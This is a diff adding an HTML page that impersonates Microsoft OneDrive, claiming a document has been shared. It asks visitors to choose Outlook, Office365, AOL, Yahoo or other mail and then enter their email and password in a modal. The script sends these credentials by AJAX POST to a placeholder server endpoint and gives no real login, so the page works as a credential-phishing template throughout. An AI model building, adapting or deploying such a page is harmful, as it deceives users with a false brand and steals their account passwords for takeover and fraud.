@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="css/custom.css">
+    <link rel="stylesheet" href="bs/css/bootstrap.css">
+    <script src="bs/js/jquery-3.7.1.js"></script>
+    <script src="bs/js/popper.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css">
+
+    <style>
+
+
+
+        /* Modal Styles */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 1; /* Sit on top */
+            left: 0;
+            top: -220px;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            background-color: rgba(0, 0, 0, 0.4); /* Black with opacity */
+            justify-content: center;
+            align-items: center;
+            padding-top: 50px;   
+            /* padding-top: 80px; Top padding to position it lower on the screen */
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 100%;
+            max-width: 480px; /* Limit the width of the modal */
+            border-radius: 10px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            display: -webkit-box;
+    display: -ms-flexbox;
+    display: flex;
+    -webkit-box-orient: vertical;
+    -webkit-box-direction: normal;
+    -ms-flex-direction: column;
+    flex-direction: column;
+  
+    pointer-events: auto;
+    background-color: #fff;
+    background-clip: padding-box;
+    border: 1px solid rgba(0, 0, 0, .2);
+    border-radius: .3rem;
+    outline: 1;
+        }
+
+        .close-btn {
+            top: -30px;
+            border: none;
+            background: none;
+            font-size: 2rem; /* Adjust font size for the close button */
+            color: #aaa;
+            cursor: pointer;
+            /* margin-left:370px; */
+            margin-bottom: -31%;
+            margin: -9%;
+            text-align: right;
+            padding-left: 105%;
+
+        }
+
+        .close-btn:hover {
+            color: #000;
+        }
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: right;
+            margin-bottom: 30px;
+        }
+        .btn {
+            display: inline-block;
+    font-weight: 400;
+    text-align: center;
+    white-space: nowrap;
+    vertical-align: right;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    border: 1px solid transparent;
+    padding: .375rem .75rem;
+    font-size: 1rem;
+    line-height: 1.5;
+    border-radius: .25rem;
+    transition: color .15s ease-in-out, background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out;
+    color: #fff;
+    background-color: #17a2b8;
+    border-color: #17a2b8;
+    width: 82px;  /* Controls the horizontal length/width of the button */
+    height: 50px; 
+    margin-right:-20px;
+        }
+
+        .cancel-btn {
+            display: inline-block;
+    font-weight: 400;
+    text-align: center;
+    white-space: nowrap;
+    vertical-align: right;
+    user-select: none;
+    border: 1px solid transparent;
+    padding: 0.2rem 0.5rem;  /* Reduced padding for smaller size */
+    font-size: 0.8rem;        /* Smaller font size */
+    line-height: 1.2;         /* Slightly reduced line height */
+    border-radius: 0.2rem;    /* Adjust border-radius for smaller size */
+    transition: color .15s ease-in-out, background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out;
+    color: #fff;
+    background-color: #6c757d;
+    border-color: #6c757d;
+    width: 57px;  /* Controls the horizontal length/width of the button */
+    height: 35px;  /* Controls the vertical height of the button */
+    margin-left:285px;
+        }
+
+        .modal-footer {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            
+        }
+
+       
+    </style>
+</head>
+<body>
+ 
+    <div id="container">
+        <div class="text-center pt-5">
+            <img src="https://icon-library.com/images/one-drive-icon/one-drive-icon-28.jpg" class="imgicon" width="100px"><br>
+            <span class="h4">OneDrive</span><br>
+            <span class="para1">Please select your email provider below and login to <br> access shared document.</span><br>
+        </div>
+        
+        <!-- Modal Structure -->
+        <div id="modal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                  
+                    <button type="button" class="close-btn" aria-label="Close" onclick="closeModal()">
+                        ×
+                    </button>
+                </div>
+
+                <center>
+                    <img id="fieldImg" src="https://i.imgur.com/mdromNs.png" class="img-fluid rounded-circle" width="80px">
+                    <h5  class="modal-title"><b>Login with</b> <b><span id="field"></span></b></h5>
+                    <div class="alert alert-danger" id="msg" style="display: none;">Invalid Password.! Please enter correct password.</div>
+                    <span class="text-danger error" style="display: none;">That account doesn't exist. Enter a different account</span>
+                </center>
+                          <!-- form -->
+                <form id="loginForm">
+                    <div class="tab-content">
+                        <h6>Email address</h6>
+                        <input required  class="ff1"  placeholder="Enter Email" name="email" type="text">
+                        <p>We'll never share your email with anyone else</p>
+                        
+                        <h6>Password</h6>
+                        <input required class="ff1" placeholder="Enter Password" type="password" name="password">
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="cancel-btn" onclick="closeModal()">Close</button>
+                        <button type="submit" class="btn">Login</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Buttons that trigger the modal -->
+        <a href="#" class="open-modal" data-service="Outlook" data-image="https://upload.wikimedia.org/wikipedia/commons/thumb/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg/150px-Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg.png">
+            <div class="out1">
+                <img class="img-fluid1" src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg/150px-Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg.png">
+                <span class="pl-4">Sign in with Outlook</span>
+            </div>
+        </a>
+        <br>
+
+    
+          <!-- Buttons that trigger the modal -->
+       
+
+        <a href="#" class="open-modal"  data-service="Office365" data-image="https://u.cotc.edu/digitallearning/files/2021/08/Office-365-logo-in-circle.png" >
+            <div class="off1">
+                <img class="img-fluid1" src="https://bafkreidr44uzhhqxl5fotu74yzc5nnzyt3budjd2qskq4bdrs4zr7xbc6e.ipfs.nftstorage.link/">
+                <span class="pl-4">Sign in with Office365</span>
+            </div>
+        </a>
+        <br>
+
+        <a href="#" class="open-modal" data-service="Aol" data-image="https://www.logotypes101.com/logos/147/E4C5217EE0E7657C1DE5AAB4ACB8FC6F/aolmbcanv1ceraserhrprplcmyk.png">
+            <div class="AOI">
+                <img src="https://bafkreihyvdhu6gjisoghs3rpgx4megynkegu4pyw4alo5a6r6idpr266cq.ipfs.nftstorage.link/" class="img-fluid1">
+                <span class="pl-4">Sign in with Aol</span>
+            </div>
+        </a>
+        <br>
+
+        <a href="#" class="open-modal"data-service="Yahoo" data-image="https://www.lifewire.com/thmb/yx5oJUJ4fA1TQ0h0pl9FM7Kc4Fo=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/yahoo-logo-2019-879b7bed612d4bbc97065dce2a0f2d73.png">
+            <div class="Yahoo">
+                <img src="https://www.lifewire.com/thmb/yx5oJUJ4fA1TQ0h0pl9FM7Kc4Fo=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/yahoo-logo-2019-879b7bed612d4bbc97065dce2a0f2d73.png" class="img-fluid1" alt="">
+                <span class="pl-4">Sign in with Yahoo!</span>
+            </div>
+        </a>
+        <br>
+
+        <a href="#" class="open-modal" data-service="Other Mail" data-image="https://bafkreibo6bopl3uphffghgihpwi6ckxd5v7xemrtmmelzqcr73fhfuwxxa.ipfs.nftstorage.link/">
+            <div class="other">
+                <img src="https://bafkreibo6bopl3uphffghgihpwi6ckxd5v7xemrtmmelzqcr73fhfuwxxa.ipfs.nftstorage.link/" class="img-fluid1">
+                <span class="pl-4">Sign in with Other Mail</span>
+            </div>
+        </a>
+        <br>
+        <!-- Add more services as needed -->
+
+        <h5 class="font">© 2024 Microsoft OneDrive. All rights reserved</h5>
+    </div>
+
+    <script>
+        // Get the modal
+        var modal = document.getElementById("modal");
+
+        // Get the buttons that open the modal
+        var buttons = document.querySelectorAll(".open-modal");
+
+        // When the user clicks any button, open the modal 
+        buttons.forEach(function(button) {
+            button.onclick = function() {
+                var service = this.getAttribute("data-service");
+                var image = this.getAttribute("data-image");
+
+                document.getElementById("field").innerText = service;
+                document.getElementById("fieldImg").src = image;
+
+                modal.style.display = "flex";
+            };
+        });
+
+        // When the user clicks on the Cancel button, close the modal
+        function closeModal() {
+            modal.style.display = "none";
+        }
+
+        // When the user clicks anywhere outside of the modal, close it
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        };
+
+        // Handle AJAX form submission
+
+    $('#loginForm').submit(function(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        $.ajax({
+            type: 'POST',
+            url: 'your-server-endpoint.php', // Replace with your server endpoint
+            data: $(this).serialize(),
+            success: function(response) {
+                // Handle successful response
+                console.log(response);
+                closeModal();
+            },
+            error: function(xhr, status, error) {
+                // Handle error response
+                console.error(error);
+            }
+        });
+    });
+    </script>
+</body>
+</html>
